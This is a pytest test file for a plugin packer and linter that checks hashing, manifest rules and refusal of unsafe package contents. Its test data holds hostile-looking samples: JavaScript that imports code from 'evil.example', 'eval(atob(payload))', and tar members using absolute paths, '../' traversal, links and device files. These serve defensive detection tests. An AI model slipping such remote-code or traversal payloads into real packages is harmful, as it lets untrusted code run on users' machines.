"""pack and lint: a package keel accepts, and the problems lint names (02-plugin-package.md, 03-security.md 3.4)."""

from __future__ import annotations

import gzip
import io
import os
import shutil
import subprocess
import tarfile
from pathlib import Path

import pytest
from conftest import REPO, set_manifest, write

from keel_plugin.lint import lint
from keel_plugin.manifest import file_sha256
from keel_plugin.package import pack


def members(kplug: Path) -> list[str]:
    with tarfile.open(kplug, "r:gz") as tar:
        return [m.name for m in tar.getmembers()]


def read_member(kplug: Path, name: str) -> str:
    with tarfile.open(kplug, "r:gz") as tar:
        return tar.extractfile(name).read().decode()


def repack(src: Path, out: Path, change: dict[str, bytes | None], extra: list[tarfile.TarInfo] = ()) -> Path:
    """A copy of a .kplug with some members changed (None removes one) and extra members added."""
    with tarfile.open(src, "r:gz") as tar, tarfile.open(out, "w:gz") as new:
        for m in tar.getmembers():
            if m.name in change:
                data = change[m.name]
                if data is None:
                    continue
                m.size = len(data)
                new.addfile(m, io.BytesIO(data))
            else:
                new.addfile(m, tar.extractfile(m) if m.isfile() else None)
        for info in extra:
            new.addfile(info, io.BytesIO(b"x" * info.size) if info.isfile() else None)
    return out


def errors_of(path: Path) -> str:
    report = lint(path)
    assert not report.ok, report.text()
    return "\n".join(report.errors)


# ---------------------------------------------------------------- pack

def test_pack_makes_a_package_with_no_top_folder_and_every_file_hashed(plugin, tmp_path, run):
    code, out, err = run("pack", plugin, "--out", tmp_path / "dist")
    assert code == 0, err
    kplug = tmp_path / "dist/hello-0.1.0.kplug"
    assert f"Hello 0.1.0: {kplug}" in out
    names = members(kplug)
    assert names == sorted(names, key=lambda s: s.encode())
    assert "keel-plugin.yml" in names and "files.sha256" in names
    assert not any(n.startswith(("hello/", "/", ".")) for n in names)
    sums = dict(reversed(line.split("  ", 1)) for line in read_member(kplug, "files.sha256").splitlines())
    with tarfile.open(kplug, "r:gz") as tar:
        files = [m.name for m in tar.getmembers() if m.isfile() and m.name != "files.sha256"]
    assert sorted(sums) == sorted(files)
    assert sums["keel-plugin.yml"] == file_sha256(plugin / "keel-plugin.yml")
    assert ".gitignore" not in names                    # hidden files stay out
    assert not (plugin / "files.sha256").exists()       # the folder is not changed


def test_pack_gives_the_same_bytes_twice(plugin, tmp_path):
    a, _, _ = pack(plugin, tmp_path / "a")
    os.utime(plugin / "keel-plugin.yml", (1, 1))
    b, _, _ = pack(plugin, tmp_path / "b")
    assert a.read_bytes() == b.read_bytes()


def test_pack_leaves_out_caches_and_old_packages(plugin, tmp_path):
    write(plugin / "engine/keel_plugin_hello/__pycache__/x.cpython-312.pyc", "c")
    write(plugin / "dist/hello-0.0.9.kplug", "old")
    write(plugin / ".DS_Store", "f")
    kplug, _, _ = pack(plugin, plugin / "dist")
    names = members(kplug)
    assert not any("__pycache__" in n or n.endswith((".pyc", ".kplug")) or ".DS_Store" in n for n in names)
    assert lint(kplug).ok


def test_pack_refuses_links_and_missing_parts(plugin, tmp_path, run):
    os.symlink("/etc/hosts", plugin / "content/hosts")
    code, _, err = run("pack", plugin, "--out", tmp_path)
    assert code == 1 and "may not hold links" in err and "content/hosts" in err
    os.unlink(plugin / "content/hosts")
    shutil.rmtree(plugin / "web")
    code, _, err = run("pack", plugin, "--out", tmp_path)
    assert code == 1 and "parts.web.entry 'web/index.js' is missing" in err
    assert not list(tmp_path.glob("*.kplug"))


def test_pack_refuses_a_broken_manifest(plugin, tmp_path, run):
    set_manifest(plugin, "version: 0.1.0", "version: 1.0")
    code, _, err = run("pack", plugin, "--out", tmp_path)
    assert code == 1 and "version 1.0 is not a version like 1.0.0" in err


def test_keels_own_installer_rules_hold_for_a_packed_file(plugin, tmp_path):
    """The same checks as keel_engine/pluginhost/store.py: members, the manifest at the top, files.sha256."""
    kplug, _, _ = pack(plugin, tmp_path)
    with tarfile.open(kplug, "r:gz") as tar:
        for m in tar.getmembers():
            assert not m.name.startswith("/") and ".." not in m.name.split("/")
            assert m.isfile() or m.isdir()
            assert m.uid == 0 and m.gid == 0
        tar.extractall(tmp_path / "x", filter="data")
    for line in (tmp_path / "x/files.sha256").read_text().splitlines():
        sha, rel = line.split("  ", 1)
        assert file_sha256(tmp_path / "x" / rel) == sha


@pytest.mark.skipif(shutil.which("bash") is None or shutil.which("tar") is None, reason="needs bash and tar")
def test_pack_matches_scripts_build_plugin_sh(tmp_path):
    """keel-plugin pack of a staged folder lists the same files with the same hashes as scripts/build-plugin.sh."""
    jar = write(tmp_path / "fake.jar", "a stand-in for the plugin jar\n")
    dist = write(tmp_path / "webdist/index.js", "export default { name: 'map' };\n").parent
    env = dict(os.environ, KEEL_PLUGIN_JAR=str(jar), KEEL_PLUGIN_WEB_DIST=str(dist))
    subprocess.run(["bash", str(REPO / "scripts/build-plugin.sh"), str(REPO / "plugins/map"), str(tmp_path / "stage"),
                    "--no-build"], check=True, env=env, capture_output=True)
    staged = next((tmp_path / "stage/map").iterdir())
    theirs = tmp_path / "stage" / f"map-{staged.name}.kplug"
    (staged / "files.sha256").unlink()      # pack makes it again
    ours, _, _ = pack(staged, tmp_path / "dist")
    assert ours.name == theirs.name
    assert read_member(ours, "files.sha256") == read_member(theirs, "files.sha256")
    assert sorted(n.rstrip("/") for n in members(ours)) == sorted(n.rstrip("/") for n in members(theirs))
    assert lint(ours).ok and lint(theirs).ok


# ---------------------------------------------------------------- lint: good

def test_lint_passes_a_folder_and_its_package(plugin, tmp_path, run):
    code, out, _ = run("lint", plugin)
    assert code == 0 and "ok: no problems found" in out and "(hello 0.1.0, trust: code)" in out
    kplug, _, _ = pack(plugin, tmp_path)
    code, out, _ = run("lint", kplug)
    assert code == 0 and "ok: no problems found" in out


def test_lint_warns_about_a_pre_release_and_a_typo_but_passes(plugin, run):
    set_manifest(plugin, "version: 0.1.0", 'version: "0.1.0-beta.1"\ntitel: Hello')
    code, out, _ = run("lint", plugin)
    assert code == 0
    assert "warning  keel-plugin.yml: version 0.1.0-beta.1 is a pre-release" in out
    assert "'titel' is not a field" in out


# ---------------------------------------------------------------- lint: the manifest

@pytest.mark.parametrize("old,new,why", [
    ("schema: 1", "schema: 2", "schema must be 1, not 2"),
    ("name: hello", "name: Hello", "name 'Hello' is not valid"),
    ("name: hello", "name: 9lives", "name '9lives' is not valid"),
    ("version: 0.1.0", "version: 1.0", "version 1.0 is not a version like 1.0.0"),
    ("version: 0.1.0", "version: v1.0.0", "version 'v1.0.0' is not a version"),
    ("  sdk: 1", "  sdk: one", "requires.sdk must be a whole number"),
    ("  sdk: 1", '  sdk: 1\n  keel: "0.15"', "requires.keel '0.15' is not a version range"),
    ("  sdk: 1", '  sdk: 1\n  plugins: { Code: ">=1.0.0" }', "requires.plugins: 'Code' is not a plugin name"),
    ("  sdk: 1", '  sdk: 1\n  plugins: { code: "latest" }', "requires.plugins.code 'latest' is not a version range"),
    ("per_project: false", "per_project: maybe", "per_project must be true or false"),
    ("package: keel_plugin_hello", "package: keel-plugin-hello", "is not a Python package name"),
    ("web: { entry: web/index.js }", "web: { entry: /srv/index.js }", "'/srv/index.js' is an absolute path"),
    ("content: content", "content: ../content", "'../content' goes outside the plugin folder"),
    ("permissions: {}", "permissions: { workspace: all }", "permissions.workspace must be read or write"),
    ("permissions: {}", "permissions: { tables: [items] }", "the table 'items' must start with 'hello_'"),
    ("permissions: {}", "contributes: { actions: [do-it] }", "contributes.actions: 'do-it' must start with 'hello:'"),
    ("permissions: {}", "contributes: { events: { emits: [done] } }", "'done' must start with 'hello.'"),
    ("permissions: {}", "contributes: { mcp: { read: [read_all] } }", "the agent tool 'read_all' must start with 'hello_'"),
])
def test_lint_names_a_broken_manifest(plugin, old, new, why):
    set_manifest(plugin, old, new)
    assert why in errors_of(plugin)


def test_lint_reads_a_manifest_that_is_not_yaml(plugin):
    write(plugin / "keel-plugin.yml", "schema: 1\nname: [hello\n")
    assert "not YAML this tool can read" in errors_of(plugin)


def test_lint_names_missing_parts(plugin):
    shutil.rmtree(plugin / "engine/keel_plugin_hello")
    (plugin / "web/index.js").unlink()
    text = errors_of(plugin)
    assert "there is no package keel_plugin_hello in 'engine'" in text
    assert "parts.web.entry 'web/index.js' is missing" in text


def test_lint_refuses_python_libraries(plugin):
    write(plugin / "engine/requirements.lock", "requests==2.32.3 --hash=sha256:00\n")
    assert "keel does not install Python libraries for a plugin yet" in errors_of(plugin)


def test_lint_finds_links_in_a_folder(plugin):
    os.symlink("../keel-plugin.yml", plugin / "content/link.yml")
    assert "'content/link.yml' is a link or a special file" in errors_of(plugin)


# ---------------------------------------------------------------- lint: the web part

@pytest.mark.parametrize("code,why", [
    ('const m = await import("https://cdn.example.com/x.js");', "loads code from the internet with import()"),
    ("import(`//evil.example/x.js`).then(run);", "loads code from the internet with import()"),
    ('import { a } from "https://cdn.example.com/a.js";', "imports a module from the internet"),
    ("import 'http://cdn.example.com/side-effect.js';", "imports a module from the internet"),
    ("eval(atob(payload));", "calls eval()"),
    ('const f = new Function("a", body);', "makes a function from text"),
])
def test_lint_finds_remote_code_and_eval_in_the_web_part(plugin, code, why):
    write(plugin / "web/chunk.js", f"// a chunk\n{code}\n")
    text = errors_of(plugin)
    assert f"web/chunk.js:2 {why}" in text


def test_lint_lets_local_imports_and_lookalikes_pass(plugin, run):
    write(plugin / "web/chunk.js", "\n".join([
        'import { a } from "./a.js";',
        'const b = await import("./b.js");',
        "obj.eval(x); retrieval(1); myFunction(2); medieval (3);",
        'const url = "https://api.example.com/data"; fetch(url);',
    ]) + "\n")
    code, out, _ = run("lint", plugin)
    assert code == 0, out


# ---------------------------------------------------------------- lint: the package file

def test_lint_finds_a_changed_file_in_a_package(plugin, tmp_path):
    kplug, _, _ = pack(plugin, tmp_path / "a")
    bad = repack(kplug, tmp_path / "hello-0.1.0.kplug", {"web/index.js": b"export default {name: 'evil'};\n"})
    assert "files.sha256: 'web/index.js' does not match its sha256" in errors_of(bad)


def test_lint_finds_a_file_that_files_sha256_does_not_list(plugin, tmp_path):
    kplug, _, _ = pack(plugin, tmp_path / "a")
    extra = tarfile.TarInfo("content/extra.md")
    extra.size = 3
    bad = repack(kplug, tmp_path / "hello-0.1.0.kplug", {}, [extra])
    assert "files.sha256: 'content/extra.md' is not listed" in errors_of(bad)


def test_lint_needs_files_sha256_in_a_package(plugin, tmp_path):
    kplug, _, _ = pack(plugin, tmp_path / "a")
    bad = repack(kplug, tmp_path / "hello-0.1.0.kplug", {"files.sha256": None})
    assert "files.sha256 is missing" in errors_of(bad)


@pytest.mark.parametrize("name,kind,why", [
    ("/etc/evil", tarfile.REGTYPE, "is an absolute path"),
    ("content/../../evil", tarfile.REGTYPE, "goes outside the plugin folder"),
    ("content/link", tarfile.SYMTYPE, "is a link"),
    ("content/hard", tarfile.LNKTYPE, "is a link"),
    ("content/dev", tarfile.CHRTYPE, "is a device"),
])
def test_lint_refuses_what_keel_refuses_in_a_package(plugin, tmp_path, name, kind, why):
    kplug, _, _ = pack(plugin, tmp_path / "a")
    info = tarfile.TarInfo(name)
    info.type = kind
    info.linkname = "keel-plugin.yml" if kind in (tarfile.SYMTYPE, tarfile.LNKTYPE) else ""
    info.size = 1 if kind == tarfile.REGTYPE else 0
    bad = repack(kplug, tmp_path / "hello-0.1.0.kplug", {}, [info])
    text = errors_of(bad)
    assert "keel refuses this package" in text and why in text


def test_lint_refuses_a_package_with_a_top_folder(plugin, tmp_path):
    out = tmp_path / "hello-0.1.0.kplug"
    with tarfile.open(out, "w:gz") as tar:
        tar.add(plugin, arcname="hello")
    assert "there is no keel-plugin.yml at the top of the package (it has a top folder: hello/)" in errors_of(out)


def test_lint_refuses_a_file_that_is_not_a_package(tmp_path, run):
    f = write(tmp_path / "x.kplug", "not a tar")
    code, out, _ = run("lint", f)
    assert code == 1 and "is not a .kplug" in out
    g = tmp_path / "y.kplug"
    g.write_bytes(gzip.compress(b"not a tar either"))
    assert "is not a .kplug" in errors_of(g)


def test_lint_warns_about_a_wrong_file_name(plugin, tmp_path):
    kplug, _, _ = pack(plugin, tmp_path)
    renamed = kplug.rename(tmp_path / "hello.kplug")
    report = lint(renamed)
    assert report.ok and "the file name should be hello-0.1.0.kplug" in report.warnings


def test_lint_exit_code_with_many_paths(plugin, tmp_path, run):
    good, _, _ = pack(plugin, tmp_path)
    bad = write(tmp_path / "bad.kplug", "x")
    assert run("lint", good)[0] == 0
    code, out, _ = run("lint", good, bad)
    assert code == 1 and out.count("keel-plugin lint:") == 2
